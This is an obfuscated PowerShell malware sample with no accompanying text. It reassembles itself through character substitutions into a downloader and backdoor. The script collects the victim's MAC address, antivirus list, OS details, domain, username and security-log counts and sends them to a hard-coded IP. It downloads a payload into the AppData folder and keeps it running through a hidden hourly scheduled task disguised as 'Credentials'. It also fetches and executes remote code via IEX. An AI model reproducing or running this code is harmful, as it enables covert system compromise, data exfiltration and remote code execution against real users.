  (('[st'+'ring]sflav = XF4XF4

[string]sflavs = XF4XF4

[string]sfllog1 = XF4XF4

[string]sfllog2 = XF4XF4

[string]sflmac = (getmac /FO CSV8exSelect-Object -Skip 1 -first 18ex ConvertFrom-'+'Csv -Header MAC8exselect-object -expand MAC)

sflavs = (Get-WmiObject -Namespace rooth8ASecurityCenter2 -Class AntiVirusProduct).displ'+'ayName

if(sflavs.GetType().'+'name.Ind'+'exOf(rpKObjectrpK) -gt -1){'+'

	for(sflv = 0; sflv -lt'+' sflavs.Count; sflv++){

		sflav += sflavs[sflv] + XF48exXF4

	}

}else{

sflav = sflavs

}

try'+'{

	if((Get-Service zhudongfang'+'yu 8ex Sort '+'-Property Status).Status -eq XF4RunningXF4){

		sflav += rpKZDFYrpK

	}

}catch{}

#[System.Threading.Th'+'read]::Sle'+'ep((Get-Random -Minimum 1'+'0000 -'+'Maximum 100000))


sflpath = XF4sflenv:temph8Ah8Appppp.logXF4

[string]sflflag = test-path sflpath


try{

sfllog1 = (Get-EventLog -'+'LogName rpKSecurityrpK -After (get-date).Add'+'Days(-7) -befor (get-date).AddDays(-3)).length

sfllog2 = (Get-EventLog -LogName rpKSecurityrpK -After (get-'+'date).AddDays(-2)).length

}catch{}


sflkey = XF4&'+'mac=XF4+sf'+'lmac+XF4&av=XF4+sfla'+'v+XF4&ver=XF4+(Get-WmiObject -Class'+' Win32_Operat'+'ingSystem).version+XF4&bit=XF4+'+'(Get-WmiObject Win32_Operat'+'ingSystem).OSArchitecture + XF4&flag2=XF4 + sfl'+'flag + XF4&domain=XF4 + (Get-WmiObject win32_computers'+'ystem).Domain '+'+ XF4&user=XF4 + sflenv:USERNAME + XF4&log1=XF4 + sfl'+'lo'+'g1 + XF4&log2=XF4 + sfllog2


if(sflflag -eq rpKFalserpK){

	try{

		sflf'+'ile = XF4sflenv:appdatah8Ah8AMicrosofth8Ah8Acred.ps1XF4

		sflsize = (Get-ChildItem sflfile -recurse 8ex Measure-Object -property length -sum).sum

		if(sflsize -ne 2997721){

			sflurl = rpKhttp://27.102.107.137/new.dat?pebbrpK + sflkey

			(New-Object Sy'+'stem.Net.WebClient).DownloadFile(sflurl,XF4sflfileXF4)

			sflsize2 = (Get-ChildItem sflfile -recurse'+' 8ex Measure-Object -property length -sum).sum

			if(sflsize2 -eq 2997721){

				sfl'+'status = rpKadd_okrpK

	'+'			if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCu'+'rrent()).IsInRole([Security.Principal.WindowsBuiltInRole] XF4AdministratorXF4)){

				&cmd.exe /c schtask'+'s /create /ru system /s'+'c'+' MINUTE /mo 60'+' /st 07:00:00 '+'/tn Credentials /tr XF4powershell -nop -w hidden '+'-ep bypass -f %appdata%h8AMicrosofth8Acred.ps1XF4 /F

				}else{

				&cmd.exe /c schtasks /create /'+'sc MINUTE /mo 60 /st 07:00:00 /tn Credent'+'ials /tr XF4powershell -nop -w hidden -ep bypass -f %appdat'+'a%h8AMicrosofth8Acred.ps1XF4 /F

				}

			}else{sflstatus'+' = rpKerrorrpK}

		}else{

		sflstatus = rpKold1rpK

		}

		New-Item sflpath -'+'type file

	}'+'catch{}

}else{

sflstatus = rpKold2rpK'+'

}


try'+'{

	sf'+'ldownloa'+'d = rpK'+'http://27.102.107.137'+'/status'+'.json?pebbrpK + sflkey  '+'+ XF4&XF4 + sflstatus  + XF4&XF4 + sflMyInvocation.MyCommand.Definition

	IEX ('+'New-Object Net.WebClient).DownloadString(XF4sfldownloadXF4)

}catch{}


try{

	&cmd.exe /c schtasks /delete'+' /tn XF4h8AMicrosofth8A'+'CredentialsXF4 /f

}'+'catch{}


[System.Threading.Thread]::Sleep(3000)

Stop-Process -Force -processname powershell

') -CREplace  'sfl',[CHAR]36 -CREplace '8ex',[CHAR]124 -REPlaCE  'XF4',[CHAR]34-CREplace  'rpK',[CHAR]39 -CREplace([CHAR]104+[CHAR]56+[CHAR]65),[CHAR]92) | Out-File ./4.ps1
